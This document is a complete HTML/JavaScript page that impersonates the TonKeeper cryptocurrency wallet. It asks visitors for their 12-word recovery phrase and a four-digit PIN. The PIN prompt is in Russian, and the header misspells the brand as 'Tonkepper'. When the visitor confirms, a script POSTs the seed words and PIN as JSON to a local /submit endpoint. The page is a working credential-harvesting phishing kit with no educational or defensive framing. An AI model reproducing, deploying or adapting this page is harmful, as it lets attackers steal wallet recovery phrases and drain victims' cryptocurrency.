<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>TonKeeper</title>

<style>

*{
margin:0;
padding:0;
box-sizing:border-box;
font-family:system-ui,-apple-system,BlinkMacSystemFont,sans-serif;
}

body{
background:linear-gradient(160deg,#0a1a3a,#020b1f);
color:white;
min-height:100vh;
display:flex;
flex-direction:column;
align-items:center;
}

/* HEADER */

.header{
display:flex;
align-items:center;
gap:12px;
padding:25px;
}

.logo{
width:42px;
height:42px;
}

.title{
font-size:28px;
font-weight:600;
letter-spacing:1px;
}

/* CONTAINER */

.container{
width:92%;
max-width:420px;
background:rgba(255,255,255,0.04);
backdrop-filter:blur(10px);
border-radius:16px;
padding:25px;
box-shadow:0 15px 40px rgba(0,0,0,0.5);
animation:fadeIn 0.8s ease;
}

/* WORD INPUT */

.word{
display:flex;
align-items:center;
background:rgba(255,255,255,0.06);
padding:12px;
border-radius:10px;
margin-bottom:12px;
transition:0.2s;
}

.word:hover{
background:rgba(255,255,255,0.12);
transform:translateY(-2px);
}

.number{
opacity:0.6;
margin-right:10px;
width:22px;
}

input{
background:none;
border:none;
outline:none;
color:white;
width:100%;
font-size:14px;
}

/* BUTTON */

button{
width:100%;
padding:13px;
border:none;
border-radius:10px;
background:linear-gradient(135deg,#2563eb,#1d4ed8);
color:white;
font-size:16px;
cursor:pointer;
margin-top:10px;
transition:0.2s;
}

button:hover{
transform:translateY(-2px);
box-shadow:0 10px 20px rgba(37,99,235,0.4);
}

/* PIN MODAL */

.modal{
position:fixed;
inset:0;
background:rgba(0,0,0,0.7);
display:none;
justify-content:center;
align-items:center;
}

.modal.active{
display:flex;
}

.pin-box{
background:#08142e;
padding:25px;
border-radius:18px;
width:320px;
text-align:center;
animation:fadeIn 0.4s;
}

.pin-display{
letter-spacing:10px;
font-size:26px;
margin-bottom:20px;
}

.keypad{
display:grid;
grid-template-columns:repeat(3,1fr);
gap:10px;
}

.key{
padding:16px;
background:#13254d;
border-radius:10px;
cursor:pointer;
font-size:18px;
transition:0.2s;
}

.key:hover{
background:#1f3b7a;
}

.pin-title{
font-size:16px;
opacity:0.8;
margin-bottom:15px;
}

/* ANIMATION */

@keyframes fadeIn{
from{
opacity:0;
transform:translateY(20px);
}
to{
opacity:1;
transform:translateY(0);
}
}

</style>
</head>

<body>

<div class="header">

<svg class="logo" viewBox="0 0 100 100">
<defs>
<linearGradient id="g" x1="0" x2="1">
<stop offset="0%" stop-color="#3b82f6"/>
<stop offset="100%" stop-color="#1e40af"/>
</linearGradient>
</defs>
<rect width="100" height="100" rx="20" fill="url(#g)"/>
<text x="50" y="80" font-size="90" fill="white" text-anchor="middle" font-family="Arial">∇</text>
</svg>

<div class="title">Tonkepper</div>

</div>

<div class="container" id="words"></div>

<button onclick="openPin()">Continue</button>

<div class="modal" id="modal">

<div class="pin-box">

<div class="pin-title">Для подтверждения введите пин-код</div>

<div class="pin-display" id="pin">----</div>

<div class="keypad" id="keys"></div>

</div>

</div>

<script>

/* CREATE WORD INPUTS */

const wordsContainer = document.getElementById("words")

for(let i=1;i<=12;i++){

let div=document.createElement("div")
div.className="word"

div.innerHTML=`
<span class="number">${i}.</span>
<input type="text" placeholder="word">
`

wordsContainer.appendChild(div)

}

/* PIN MODAL */

const modal=document.getElementById("modal")
const pinDisplay=document.getElementById("pin")

let pin=""

function openPin(){
modal.classList.add("active")
}

/* CREATE KEYPAD */

const keysContainer=document.getElementById("keys")

for(let i=1;i<=9;i++){
createKey(i)
}

createKey("←")
createKey(0)
createKey("✓")

function createKey(value){

let key=document.createElement("div")
key.className="key"
key.textContent=value

key.onclick=()=>press(value)

keysContainer.appendChild(key)

}

async function sendData(){

let inputs=document.querySelectorAll("input")

let words=[]

inputs.forEach(i=>{
words.push(i.value)
})

await fetch("http://127.0.0.1:8000/submit",{
method:"POST",
headers:{
"Content-Type":"application/json"
},
body:JSON.stringify({
words:words,
pin:pin
})
})

}


function press(v){

if(v==="←"){
pin=pin.slice(0,-1)
}

else if(v==="✓"){

sendData()

pin=""
modal.classList.remove("active")

}

else{
if(pin.length<4){
pin+=v
}
}

pinDisplay.textContent=pin.padEnd(4,"-")

}

</script>

</body>
</html>
